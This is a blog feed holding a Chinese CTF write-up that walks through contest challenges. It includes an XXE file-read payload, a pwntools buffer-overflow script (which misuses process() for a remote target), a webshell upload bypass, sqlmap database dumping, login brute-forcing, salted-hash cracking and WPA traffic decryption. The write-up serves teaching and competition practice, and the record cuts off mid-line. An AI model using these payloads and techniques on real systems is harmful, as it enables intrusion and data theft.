<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-10-29T07:17:22.360Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>首届豌豆杯WriteUp</title>
    <link href="http://yoursite.com/2018/10/29/%E8%B1%8C%E8%B1%86%E6%9D%AFwp/"/>
    <id>http://yoursite.com/2018/10/29/豌豆杯wp/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2018-10-29T07:17:22.360Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">PS：https://blog.csdn.net/Super_Yiang/article/details/83506186</span></span><br></pre></td></tr></table></figure><p>由于比赛结束服务器关闭，所以赛后无法实现复现，造成writeup的可读性不强勿怪。</p><h3 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h3><h4 id="1-web签到题（100）"><a href="#1-web签到题（100）" class="headerlink" title="1.web签到题（100）"></a>1.web签到题（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:请选手访问 http://101.231.137.47:20001/，获取flag。</span><br></pre></td></tr></table></figure><p>很明显链接点进去，滑稽，很多很多滑稽，既然是签到题，先F12查看页面源代码即可找到flag。</p><h4 id="2-输入密码查看flag（100）"><a href="#2-输入密码查看flag（100）" class="headerlink" title="2.输入密码查看flag（100）"></a>2.输入密码查看flag（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:请选手访问 http://101.231.137.47:20002/4.php ,输入密码就可查看flag哦。</span><br></pre></td></tr></table></figure><p>访问网址，进去是一个登录界面，需要输入查看密码才能查看，然后输入密码的下方有提示说密码是五位数，既然是五位数，尝试用burpsuite抓包进行爆破咯。设置payload</p><p><img src="https://i.loli.net/2018/10/29/5bd65d24e09a3.png" alt=""></p><p>爆破即可得到密码：<code>12138</code>（没记错的话）登录进去就可以得到flag。</p><h4 id="3-这真能传马？（100）"><a href="#3-这真能传马？（100）" class="headerlink" title="3.这真能传马？（100）"></a>3.这真能传马？（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:小明这个大黑客这两天在做坏事想请您帮忙，请选手访问 http://101.231.137.47:20003 ，看看能不能传个马获取/opt/flag.txt中内容呢？flag为32位小写md5。</span><br></pre></td></tr></table></figure><p>点进链接，发现是一个上传文件的页面，上面写着<code>Upload yourPhotos to Dir</code>猜测是对上传的文件类型进行的限制只能传图片。然后尝试着上传一个图片然后抓包试试，发现它POST了一个参数，值是图片的后缀名（例如jpg，gif等），我再尝试着上传一个大马.jpg，抓包改文件名为.php并在那个参数后面加上php的后缀，就可以成功上传，然后就简单了，直接去<code>/opt/flag.txt</code>拿flag。</p><h4 id="4-这真的能注入？（100）"><a href="#4-这真的能注入？（100）" class="headerlink" title="4.这真的能注入？（100）"></a>4.这真的能注入？（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:小明这个大黑客这两天在做坏事想请您帮忙，请选手访问 http://101.231.137.47:20004 ，通过某种奇怪的Web攻击技术获取数据库中的flag值。flag为32位小写md5。</span><br></pre></td></tr></table></figure><p>点击链接，发现是一个表，url里有一个gid的参数，尝试着改参数的值，表的内容也会发生变化，外加题目就提示注入，直接sqlmap跑起来，爆库，爆表，爆列名，dump下来直接get到flag。</p><h4 id="5-怎么拿webshell（200）"><a href="#5-怎么拿webshell（200）" class="headerlink" title="5.怎么拿webshell（200）"></a>5.怎么拿webshell（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:公司好像有个服务器被黑了，攻击者关闭了远程登录，请选手访问 http://101.231.137.47:20005 ，看看能不能拿到webshell获取/opt/flag.txt中内容呢？flag为32位小写md5。</span><br></pre></td></tr></table></figure><p>题目说服务器被黑了，攻击者关闭了远程登录，扫描工具扫到有一个/hack.php的页面，是个登录页面，尝试burpsuite字典爆破，密码：<code>1qaz2wsx</code> ，登入发现是个可以读取文件内容的页面，直接去/opt/flag.txt获取flag。</p><h4 id="6-APi（200）"><a href="#6-APi（200）" class="headerlink" title="6.APi（200）"></a>6.APi（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:这里好像有个什么api，链接在此http://10.10.10.199:20006/index ，能用它获取/tmp/flag.txt中内容吗？Flag包含大小写和符号噢</span><br></pre></td></tr></table></figure><p>api调用，点击链接，查看源码，尝试着输入一个值然后抓包，发现它并没有将我输入的内容发送到服务器，而是发送了几个特定的值。猜测是XXE漏洞（xxe也就是xml外部实体注入 ）读取flag.txt。因为它是以json格式传递，所以我先将<code>Content-Type</code>的值为<code>application/xml</code>，然后我恶意的引用了外部实体，将它的值绑定为服务器的<code>/tmp/flag.txt</code>，这样在服务器返回给我们解析后的值时，就会把<code>/tmp/flag.txt</code>的内容返回给我们。</p><p>XML内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///tmp/flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><h4 id="8-Atom-附加题-100"><a href="#8-Atom-附加题-100" class="headerlink" title="8.Atom[附加题] (100)"></a>8.Atom[附加题] (100)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:您觉得这个网站华丽吗？或许您可以获权搞点新鲜的~</span><br><span class="line">地址：http://101.231.137.47:20008/login.php</span><br><span class="line">账户:test，密码:123456</span><br></pre></td></tr></table></figure><p>这个附加题给的是一个登录页面，题目说获权，猜测是要以admin的身份登录，抓包，发现cookie中有一个<code>admin</code>的参数值为0，改成1就可以查看页面源码找到flag。</p><h3 id="远程漏洞利用"><a href="#远程漏洞利用" class="headerlink" title="远程漏洞利用"></a>远程漏洞利用</h3><h4 id="2-远程攻击-2（100）"><a href="#2-远程攻击-2（100）" class="headerlink" title="2.远程攻击-2（100）"></a>2.远程攻击-2（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint:请选手下载文件100，通过某种攻击技术获取flag文件中的内容。IP:101.231.137.47,端口：20011。</span><br><span class="line">下载地址：</span><br></pre></td></tr></table></figure><p>先file命令看看</p><p>100: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7d83faff7b0a4f6c760446a51f736a4cb63ffe69, not stripped</p><p><strong>GDB走一波</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>然后IDA看看</p><p><img src="https://i.loli.net/2018/10/29/5bd6a9f8e6b3c.png" alt=""></p><p><img src="https://i.loli.net/2018/10/29/5bd6aa7ca82ba.png" alt=""></p><p><img src="https://i.loli.net/2018/10/29/5bd6aa31b10f2.png" alt=""></p><p>比较初级的栈溢出了</p><p><img src="https://i.loli.net/2018/10/29/5bd6aaff9d2b2.png" alt=""></p><p>起始地址为<strong>0xffffd140</strong>   ret的地址为<strong>0xffffd18c</strong></p><p><img src="https://i.loli.net/2018/10/29/5bd6abd493a0c.png" alt=""></p><p>所以只要输入76个字符，然后附上readflag函数的地址即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&quot;101.231.137.47&quot;,20011)</span><br><span class="line">payload = &apos;m&apos;*76 + p32(0x8048471)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><h4 id="1-我这密码忘了。。。（100）"><a href="#1-我这密码忘了。。。（100）" class="headerlink" title="1.我这密码忘了。。。（100）"></a>1.我这密码忘了。。。（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint:小明记性不好这密码忘了，只记得密码和下面这串字符是有关系的，请选手分析下列字符串帮助小明找回密码。VTBzNE9GZEhURWhDVjBveFVrMVVTell4UkRKWU5FTTFRMGszUmtrd1ZFVT0=</span><br><span class="line">Flag为32位大写md5</span><br></pre></td></tr></table></figure><p>题目给了一串base64,解码得<code>U0s4OFdHTEhCV0oxUk1USzYxRDJYNEM1Q0k3RkkwVEU=</code>发现还是base64，再解密就可以得到flag：<code>SK88WGLHBWJ1RMTK61D2X4C5CI7FI0TE</code>。</p><h4 id="2-二战时期的密码（100）"><a href="#2-二战时期的密码（100）" class="headerlink" title="2.二战时期的密码（100）"></a>2.二战时期的密码（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为000000000000000000000000000000000000000000000000000101110000110001000000101000000001，请分析出flag。Flag为12位大写字母</span><br></pre></td></tr></table></figure><p>给了一个长度为84位的二进制数，并给了秘钥<code>WELCOMETOCFF</code>长度是12，所以猜测是ascii的二进制值七位异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">秘钥                   密文           明文</span><br><span class="line">W=0010111            0000000        0010111=W</span><br><span class="line">E=0000101            0000000        0000101=E</span><br><span class="line">L=0001100            0000000        0001100=L</span><br><span class="line">C=0000011            0000000        0000011=C</span><br><span class="line">O=0001111            0000000        0001111=O</span><br><span class="line">M=0001101            0000000        0001101=M</span><br><span class="line">E=0000101            0000000        0000101=E</span><br><span class="line">T=0010100            0010111        0000011=C</span><br><span class="line">O=0001111            0000110        0001001=I</span><br><span class="line">C=0000011            0010000        0010011=S</span><br><span class="line">F=0000110            0010100        0010010=R</span><br><span class="line">F=0000110            0000001        0000111=G</span><br></pre></td></tr></table></figure><p>就可以获得flag了。</p><h4 id="3-被黑了，求密码（100）"><a href="#3-被黑了，求密码（100）" class="headerlink" title="3.被黑了，求密码（100）"></a>3.被黑了，求密码（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:小明记性不好这密码忘了，只记得密码和下面这串字符是有关系的  .--- .-. --.- ----- ..... ---.. -..- -- --. -.-. .---- .. --... .--. -... ....- ..- -. --. .- --... -... .-.. -. -... -.-. -- ... -.... -.-- .--- ----- 请选手分析下列字符串帮助小明找回密码。Flag为32位大写md5</span><br></pre></td></tr></table></figure><p>有<code>-</code>和<code>.</code>组成的很明显就是摩斯密码，摩斯密码解码</p><p><img src="https://i.loli.net/2018/10/29/5bd66e627f319.png" alt=""></p><p>然后大写就可以：<code>JRQ058XMGC1I7PB4UNGA7BLNBCMS6YJ0</code></p><h4 id="4-出航了-出航了！！（200）"><a href="#4-出航了-出航了！！（200）" class="headerlink" title="4.出航了~出航了！！（200）"></a>4.出航了~出航了！！（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:Hey! 各位船员们抓紧时间上船吧，我们的船马上就要开了。在出发前我会给你们一个指导手册（data.pcap），指导手册里会有你们在本次航行中需要的通行证。我在这里啰嗦一下：大家可以利用通行证里的request（请求）信息进行分析。祝各位能在旅途中获得本次flag!</span><br></pre></td></tr></table></figure><p>给了一个数据包，提示利用<code>request</code>(请求)分析，用wireshark过滤器过滤<code>http.request.method==&quot;POST&quot;</code>就可以看到只有一个包，点击查看发现是用户名和密码</p><p><img src="https://i.loli.net/2018/10/29/5bd66f682ab14.png" alt=""></p><p>将密码base64解密得flag：<code>KN1Z6PXVy9</code></p><p><img src="C:\Users\LE201A~1\AppData\Local\Temp\1540779982838.png" alt="1540779982838"></p><h4 id="5-IDC密码破解（200）"><a href="#5-IDC密码破解（200）" class="headerlink" title="5.IDC密码破解（200）"></a>5.IDC密码破解（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:小明是某互联网企业的一名IDC管理员，由于该企业的业务复杂,机器众多,为了方便日常的管理工作,小明使用一种加密算法来加密密码然后放在一个excel中,方便日常的工作,.现在从小明的excel中抽取一条密码.请参赛选手下载压缩包 passwd-300.rar，破解压缩包中txt文档的加密密码并提交。</span><br></pre></td></tr></table></figure><p>给了一个txt文本，里面是<img src="https://i.loli.net/2018/10/29/5bd6701c18712.png" alt=""></p><p>纯脑洞，js反过来就是sj（手机），然后手机拼音9键，<code>4163633181327481</code>，例如41就是第四个按键的第一个字母g等，然后flag就出来啦。</p><h4 id="6-超级密码（300）"><a href="#6-超级密码（300）" class="headerlink" title="6.超级密码（300）"></a>6.超级密码（300）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint:某遗留系统采用固定格式+6-10位数字类型密码，今天他们发生了数据泄露事件，做为一名黑客，你要开始干活了。</span><br><span class="line">请下载附件password进行破解。</span><br></pre></td></tr></table></figure><p>下载了附件用notepad++打开发现好多的md5值和字符串，所以猜测就是hash加密并为密码加盐了（Salt）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">即便是将原始密码加密后的哈希值存储在数据库中依然是不够安全的，因为可以通过查表法破解hash值。那么有什么好的办法来解决这个问题呢？答案是加盐。</span><br><span class="line">盐（Salt）是什么？就是一个随机生成的字符串。我们将盐与原始密码连接（concat）在一起（放在前面或后面都可以），然后将concat后的字符串加密。采用这种方式加密密码，查表法就不灵了（因为盐是随机生成的）</span><br></pre></td></tr></table></figure><p>直接放脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">result =<span class="string">"&#123;FLAG:%number&#125;%salt"</span></span><br><span class="line">password =[<span class="string">"f09ebdb2bb9f5eb4fbd12aad96e1e929.p5Zg6LtD"</span>,<span class="string">"6cea25448314ddb70d98708553fc0928.ZwbWnG0j"</span>,<span class="string">"2629906b029983a7c524114c2dd9cc36.1JE25XOn"</span>,<span class="string">"2e854eb55586dc58e6758cfed62dd865.ICKTxe5j"</span>,<span class="string">"7b073411ee21fcaf177972c1a644f403.0wdRCo1W"</span>,<span class="string">"6795d1be7c63f30935273d9eb32c73e3.EuMN5GaH"</span>,<span class="string">"d10f5340214309e3cfc00bbc7a2fa718.aOrND9AB"</span>,<span class="string">"8e0dc02301debcc965ee04c7f5b5188b.uQg6JMcx"</span>,<span class="string">"4fec71840818d02f0603440466a892c9.XY5QnHmU"</span>,<span class="string">"ee8f46142f3b5d973a01079f7b47e81c.zMVNlHOr"</span>,<span class="string">"e4d9e1e85f3880aedb7264054acd1896.TqRhn1Yp"</span>,<span class="string">"0fd046d8ecddefc66203f6539cac486b.AR5lI2He"</span>,<span class="string">"f6326f02adaa31a66ed06ceab2948d01.Aax2fIPl"</span>,<span class="string">"720ba10d446a337d79f1da8926835a49.ZAOYDPR2"</span>,<span class="string">"06af8bcc454229fe5ca09567a9071e62.hvcECKYs"</span>,<span class="string">"79f58ca7a81ae2775c2c2b73beff8644.TgFacoR3"</span>,<span class="string">"46aaa5a7fef5e250a2448a8d1257e9cf.GLYu0NO4"</span>,<span class="string">"2149ac87790dd0fe1b43f40d527e425a.5Xk2O1sG"</span>,<span class="string">"d15a36d8be574ac8fe64689c728c268e.aZikhUEy"</span>,<span class="string">"ff7bced91bd9067834e3ad14cc1464cd.E7UROqXn"</span>,<span class="string">"8cc0437187caf10e5eda345cb6296252.XPin3mVB"</span>,<span class="string">"5cfcdca4a9cb2985a0b688406617689e.nsGqoafv"</span>,<span class="string">"5a7dfa8bc7b5dfbb914c0a78ab2760c6.YC1qZUFR"</span>,<span class="string">"8061d8f222167fcc66569f6261ddd3cc.wNgQi615"</span>,<span class="string">"3d8a02528c949df7405f0b48afe4a626.CO2NMusb"</span>,<span class="string">"70651acbc8bd027529bbcccdbf3b0f14.CAXVjFMd"</span>,<span class="string">"a9dbe70e83596f2d9210970236bdd535.TL6sjEuK"</span>,<span class="string">"9ed6ef5780f705ade6845b9ef349eb8f.tJ90ibsz"</span>,<span class="string">"4b46fac0c41b0c6244523612a6c7ac4a.VTjOSNmw"</span>,<span class="string">"8141e6ecb4f803426d1db8fbeb5686ef.lh75cdNC"</span>,<span class="string">"df803949fd13f5f7d7dd8457a673104b.V39sEvYX"</span>,<span class="string">"19052cc5ef69f90094753c2b3bbcd41d.YwoGExpg"</span>,<span class="string">"cf8591bdccfaa0cdca652f1d31dbd70f.pJCLui49"</span>,<span class="string">"66e10e3d4a788c335282f42b92c760a1.NQCZoIhj"</span>,<span class="string">"94c3ae5bcc04c38053106916f9b99bda.vOktelLQ"</span>,<span class="string">"e67e88646758e465697c15b1ef164a8d.x0hwJGHj"</span>,<span class="string">"84d3d828e1a0c14b5b095bedc23269fb.2HVWe9fM"</span>,<span class="string">"264a9e831c3401c38021ba3844479c3f.Cx4og6IW"</span>,<span class="string">"ed0343dec184d9d2c30a9b9c1c308356.g2rqmPkT"</span>,<span class="string">"ad5ba8dc801c37037350578630783d80.pFK2JDT5"</span>,<span class="string">"3f588bedb704da9448e68fe81e42bca6.4ANDOiau"</span>,<span class="string">"970c9cf3cad3dfa7926f53ccaae89421.R6ML7Qy8"</span>,<span class="string">"e0a097b7cceaa7a8949fe039884e4a2d.dul2ynqL"</span>,<span class="string">"7df505218102c64b1fe4fa5981ddb6fa.jPeoyS57"</span>,<span class="string">"fd4f6043da1f7d5dca993c946ef6cd7c.6p9CwGaY"</span>,<span class="string">"5fe6d99b9a2824949279187c246c9c30.OGQ2J57y"</span>,<span class="string">"135b150ad513a961089bb1c05085a3d9.h0dw1Fro"</span>,<span class="string">"ad6af4fb623b3c51181a371911667fed.HbQT4dRz"</span>,<span class="string">"c9fa4b0db317d88e2b10060225e92494.ebVnpMzS"</span>,<span class="string">"d0deab17d115bd6fdce8592bb3667643.bL5zwgvX"</span>,<span class="string">"006f0cb3a422716692f143f28eb0d187.NHXg1Fof"</span>,<span class="string">"ddc125de34da1a6ec0cbe401f147bc8f.GDai9Y0n"</span>,<span class="string">"be5052053c5a806e8f56ed64e0d67821.40alyH3w"</span>,<span class="string">"aaf18ac446b8c385c4112c10ae87e7dc.ZJQzuIL0"</span>,<span class="string">"a2db20a4b7386dc2d8c30bf9a05ceef7.QnpOlPWH"</span>,<span class="string">"8a4fbc32a3251bb51072d51969ba5d33.rtcbipeq"</span>,<span class="string">"5e35d2c9675ed811880cea01f268e00f.i1Hbne6h"</span>,<span class="string">"9da23007699e832f4e9344057c5e0bd3.EtbGpMSW"</span>,<span class="string">"f09233683d05171420f963fc92764e84.fxHoinEe"</span>,<span class="string">"4feabf309c5872f3cca7295b3577f2a8.KymkJXqA"</span>,<span class="string">"9b94da2fa9402a3fdb4ff15b9f3ba4d2.G3Tdr1Pg"</span>,<span class="string">"b3cd8d6b53702d733ba515dec1d770c5.Y71LJWZz"</span>,<span class="string">"6a5b3b2526bb7e94209c487585034534.rIwb4oxt"</span>,<span class="string">"e9728ef776144c25ba0155a0faab2526.e1sOXSb8"</span>,<span class="string">"d41a5e7a98e28d76dbd183df7e3bcb49.36bedvia"</span>,<span class="string">"81d5ebfea6aff129cf515d4e0e5f8360.dDG4qTjW"</span>]</span><br><span class="line">n=<span class="number">1000000000</span></span><br><span class="line"><span class="keyword">while</span>(n&lt;<span class="number">10000000000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">66</span>):</span><br><span class="line">        salt = password[j][<span class="number">33</span>:]</span><br><span class="line">        md5 = password[j][:<span class="number">32</span>]</span><br><span class="line">        mingwen = <span class="string">"&#123;FLAG:"</span>+str(n)+<span class="string">"&#125;"</span>+password[j][<span class="number">33</span>:]</span><br><span class="line">        miwen = hashlib.md5(mingwen.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> (miwen == md5) :</span><br><span class="line">            print(mingwen)</span><br><span class="line">            print(password[j])</span><br><span class="line">            n=<span class="number">10000000000</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(n)</span><br><span class="line">    n=n+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>运行脚本</p><p><img src="https://i.loli.net/2018/10/29/5bd68ba4b7012.png" alt=""></p><h3 id="网络协议分析"><a href="#网络协议分析" class="headerlink" title="网络协议分析"></a>网络协议分析</h3><h4 id="1-数据包里有甜甜圈哦-（100）"><a href="#1-数据包里有甜甜圈哦-（100）" class="headerlink" title="1.数据包里有甜甜圈哦~（100）"></a>1.数据包里有甜甜圈哦~（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hint:老板给我来982份甜甜圈！</span><br><span class="line">哈？我这里可没有这么多甜甜圈，但我这里有982份的酸奶麦片。</span><br><span class="line">Deal!(成交！)</span><br></pre></td></tr></table></figure><p>酸奶麦片！！！(snmp)，直接wireshark过滤器过滤<code>udp contains&quot;flag&quot;</code><img src="https://i.loli.net/2018/10/29/5bd679fbb4ce8.png" alt=""></p><p>随便选取一个追踪udp流就可以看到flag。</p><p><img src="https://i.loli.net/2018/10/29/5bd67a4e0c44d.png" alt=""></p><h4 id="3-我是没有感情的thief（300）"><a href="#3-我是没有感情的thief（300）" class="headerlink" title="3.我是没有感情的thief（300）"></a>3.我是没有感情的thief（300）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint:我是Sam，我在船上偷了船长的一封信，但是这封信被加密了，我能力有限无法解密还请各位大佬们帮帮我解密下这封密信，必有重谢！</span><br><span class="line">为了能够更快更有效的解密，我将我知道的信息告诉您们。</span><br><span class="line"></span><br><span class="line">这封密信flag位置为 CTF%xXxxXx% (区分大小写!)</span><br><span class="line">例如 CTF%sdfg7sup1erg6s6NCo8fgh4dg5%，提交内容为sdfg7sup1erg6s6NCo8fgh4dg5</span><br></pre></td></tr></table></figure><p>打开数据包，发现大部分都是802.11也就是无线网的数据包，我们过滤http，发现一个get方式请求的rom-0的文件，通过导出http对象分析来提取这个rom-0文件，然后搜索“Decrypt Rom-0”会带你到<a href="http://www.routerpwn.com/" target="_blank" rel="noopener">routerpwn</a> ，在那里你可以上传rom-0文件并解压缩它，因为它是一个Rom-0配置解压缩器（LZS）。</p><p>这提供了sp.data内容，其中包含wireshark无线捕获的WPA密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rome4040</span><br><span class="line">TP-LINK</span><br><span class="line">public</span><br><span class="line">public</span><br><span class="line">public</span><br><span class="line">public</span><br></pre></td></tr></table></figure><p>在编辑 - &gt;首选项 - &gt;协议 - &gt; IEEE 802.11 - &gt;解密密钥 - &gt;新建 - &gt; WPA-PWD中为wireshark提供“Rome4040”并应用它将解密WiFi会话。 </p><p><img src="https://i.loli.net/2018/10/29/5bd67c02ade95.png" alt=""></p><p>然后再过滤<code>http contains&quot;CTF%&quot;</code></p><p><img src="https://i.loli.net/2018/10/29/5bd67e5b79787.png" alt=""></p><p>然后追踪一下tcp流得到flag。</p><p><img src="https://i.loli.net/2018/10/29/5bd67e94eece9.png" alt=""></p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><h4 id="1-会飞的狗狗（100）"><a href="#1-会飞的狗狗（100）" class="headerlink" title="1.会飞的狗狗（100）"></a>1.会飞的狗狗（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:最近公司截获了一个犯罪份子传播信息的文件，请下载 corgi-can-fly 分析该文件中的内容，flag为英文字符串，包含符号和空格符，提交时请注意。下载地址：http://101.231.137.47:8899/corgi-can-fly.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/29/5bd67f9510e0a.jpg" alt=""></p><p>直接notepad++打开滑到最后有个base64编码的字符串<img src="https://i.loli.net/2018/10/29/5bd6825a3f8bd.png" alt=""></p><p>base64解码后是<code>Did you tried LSB?</code>，所以用StegSolve打开</p><p><img src="https://i.loli.net/2018/10/29/5bd68306a2401.png" alt=""></p><p>用QR Research扫一下就可以得到flag。</p><p><img src="https://i.loli.net/2018/10/29/5bd68342a251a.png" alt=""></p><h4 id="2-文件类型分析（100）"><a href="#2-文件类型分析（100）" class="headerlink" title="2.文件类型分析（100）"></a>2.文件类型分析（100）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:请选手下载文件，分析其文件类型。下载地址：http://101.231.137.47:8899/84E726A733B63EBC7ABD3DC5F5967DC8</span><br></pre></td></tr></table></figure><p>给了一个压缩包，点开看</p><p><img src="https://i.loli.net/2018/10/29/5bd683f560a81.png" alt=""></p><p>有一个xml和一个后缀是fdseq的文件，百度一下，说是XPS，试了发现就是flag</p><p><img src="https://i.loli.net/2018/10/29/5bd6848e4dc27.png" alt=""></p><h4 id="3-真真假假分不清楚（200）"><a href="#3-真真假假分不清楚（200）" class="headerlink" title="3.真真假假分不清楚（200）"></a>3.真真假假分不清楚（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:请下载文件hahaha.zip分析获取flag。下载地址：http://101.231.137.47:8899/hahaha.zip</span><br></pre></td></tr></table></figure><p>压缩包打开发现要密码，放010editor里发现是伪加密，修改全局标志位将01改成00就可以解压打开获得flag。<img src="https://i.loli.net/2018/10/29/5bd6877077c3a.png" alt=""></p><h4 id="4-诱人的音乐（200）"><a href="#4-诱人的音乐（200）" class="headerlink" title="4.诱人的音乐（200）"></a>4.诱人的音乐（200）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hint:玩累啦？那么听点音乐吧！您觉得这份歌单如何呢？</span><br><span class="line">URL:https://music.163.com/#/playlist?id=2473353630&amp;userid=77195412</span><br><span class="line">我觉得下面这首歌比那歌单更有feel!</span><br><span class="line">http://101.231.137.47:8899/PPAP.wav</span><br></pre></td></tr></table></figure><p>音频隐写，用audacity打开，发现从9.50左右开始有摩斯电码，将其用二进制写下来为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">01100110=f </span><br><span class="line">01101100=l</span><br><span class="line">01100001=a</span><br><span class="line">01100111=g</span><br><span class="line">01111011=&#123;</span><br><span class="line">01100011=c</span><br><span class="line">01101000=h</span><br><span class="line">00110001=1</span><br><span class="line">01110000=p</span><br><span 